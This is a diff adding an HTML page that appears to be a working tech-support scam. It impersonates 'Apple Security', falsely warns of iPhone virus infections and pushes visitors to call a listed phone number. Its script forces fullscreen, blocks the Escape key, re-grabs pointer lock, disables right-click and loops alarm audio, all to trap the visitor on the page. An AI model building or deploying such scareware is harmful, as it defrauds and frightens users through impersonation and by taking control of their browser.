@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Full-Screen Popup Example</title>
+  <link rel="stylesheet" href="styles.css" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/prismjs/themes/prism.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Geologica:wght@100..900&family=Lexend:wght@100..900&display=swap"
+    rel="stylesheet" />
+
+  <script>
+    if (!isSecureContext) location.protocol = "https:";
+  </script>
+  <script src="https://unpkg.com/prismjs"></script>
+</head>
+
+<body>
+  <div id="popup" class="popup">
+    <div class="main-modal">
+      <div class="modal_wrap">
+        <div class="head">
+          <img src="./images/log.png" class="logo" alt="" />
+          <h6 class="title">Apple Security</h6>
+        </div>
+
+        <div class="body">
+          <h2 class="title">
+            Wraning Your Apple iPhone is severely damaged by 13 viruses
+          </h2>
+          <p class="description">
+            We have detected that your Browser is (62%) DAMAGED by BROWSER
+            TROJAN VIRUSES picked up while surfing recent corrupted sites.
+            Immediate action is required to prevent it from
+            <span class="para">
+              spreading and infecting sensitive data like your. Facebook
+              account, Whatsapp messages photos and private.applications.
+            </span>
+          </p>
+          <h6 class="heading">
+            Here is how you can solve this in just a few seconds (Step by
+            Step)
+          </h6>
+          <div class="step_group">
+            <p class="step">
+              Step 1: Tap REMOVE VIRUS to install VPN from the
+            </p>
+            <p class="step">
+              Step 2: Tap REMOVE VIRUS to install VPN from the
+            </p>
+            <p class="step">
+              Step 3: Tap REMOVE VIRUS to install VPN from the
+            </p>
+            <p class="step">
+              Step 4: Tap REMOVE VIRUS to install VPN from the
+            </p>
+            <p class="step">
+              Step 5: Tap REMOVE VIRUS to install VPN from the
+            </p>
+          </div>
+
+          <div class="card">
+            <div class="wrap">
+              <img src="./images/Settings.png" class="logo" alt="" />
+              <span class="badge">1</span>
+            </div>
+            <div class="">
+              <h6 class="card-title">
+                Please call apple support now To fix this issue
+              </h6>
+              <p class="desc">Immediate Action Is Required</p>
+            </div>
+          </div>
+          <button type="button" class="card_btn">OK</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="main-modal-2">
+      <img src="./images/warning.png" alt="" class="warning_logo" />
+      <h5 class="title">
+        Call apple support now To fix this issue +1 (405) 723 3755
+      </h5>
+
+      <button class="confirm_btn">OK</button>
+    </div>
+
+    <audio controls autoplay loop id="background-audio">
+      <source src="./images/audio.mp3" type="audio/mpeg" />
+      Your browser does not support the audio element.
+    </audio>
+
+    <!-- <audio id="background-audio" src="./images/17167046424682n662kss-voicemaker.in-speech.mp3" autoplay loop></audio> -->
+  </div>
+
+  <script>
+    const audio = document.getElementById("background-audio");
+    let started = false;
+
+    // Disable right click
+    document.addEventListener("contextmenu", (event) => {
+      event.preventDefault();
+    });
+
+    // Disable drag
+    document.addEventListener("dragstart", (event) => {
+      event.preventDefault();
+    });
+
+    function tryPlayAudio() {
+      if (audio) {
+        audio.play().catch((error) => {
+          console.log("Autoplay was prevented:", error);
+        });
+      }
+    }
+
+    // Start on click anywhere in popup
+    document.getElementById("popup").addEventListener("click", async function startPage() {
+
+      if (started) return;
+
+      tryPlayAudio();
+
+      try {
+        // Enter fullscreen
+        if (!document.fullscreenElement) {
+          await document.documentElement.requestFullscreen({
+            navigationUI: "hide"
+          });
+        }
+
+        // Lock Escape key
+        if (navigator.keyboard?.lock) {
+          try {
+            await navigator.keyboard.lock(["Escape"]);
+            console.log("Escape locked");
+          } catch (error) {
+            console.warn("Keyboard Lock unavailable:", error);
+          }
+        }
+
+        // Pointer lock
+        if (!document.pointerLockElement) {
+          await document.body.requestPointerLock();
+        }
+
+        started = true;
+
+        console.log("Fullscreen + ESC lock + Pointer Lock active");
+
+      } catch (error) {
+        console.error("Unable to start:", error);
+      }
+
+    });
+
+
+    // Block ESC key
+    window.addEventListener("keydown", function (event) {
+      tryPlayAudio();
+      if (
+        started &&
+        (event.key === "Escape" || event.keyCode === 27)
+      ) {
+        event.preventDefault();
+        event.stopPropagation();
+        event.stopImmediatePropagation();
+
+        // Re-lock pointer
+        setTimeout(() => {
+          if (
+            started &&
+            document.fullscreenElement &&
+            !document.pointerLockElement
+          ) {
+            document.body.requestPointerLock();
+          }
+        }, 100);
+
+        return false;
+      }
+
+    }, true);
+
+
+    // Block ESC key release
+    window.addEventListener("keyup", function (event) {
+
+      if (
+        started &&
+        (event.key === "Escape" || event.keyCode === 27)
+      ) {
+        event.preventDefault();
+        event.stopPropagation();
+        event.stopImmediatePropagation();
+
+        return false;
+      }
+
+    }, true);
+
+
+    // Re-lock pointer if ESC releases it
+    document.addEventListener("pointerlockchange", function () {
+
+      if (
+        started &&
+        document.fullscreenElement &&
+        !document.pointerLockElement
+      ) {
+        setTimeout(() => {
+          if (started && document.fullscreenElement) {
+            document.body.requestPointerLock();
+          }
+        }, 300);
+      }
+
+    });
+
+
+    // If fullscreen is exited, reset
+    document.addEventListener("fullscreenchange", function () {
+
+      if (!document.fullscreenElement && started) {
+
+        started = false;
+
+        if (navigator.keyboard?.unlock) {
+          navigator.keyboard.unlock();
+        }
+
+        if (document.pointerLockElement) {
+          document.exitPointerLock();
+        }
+
+
+        console.log("Fullscreen exited");
+      }
+
+    });
+
+
+    // Keep window focused
+    window.addEventListener("blur", function () {
+
+      if (started) {
+        window.focus();
+      }
+
+    });
+  </script>
+</body>
+
+</html>
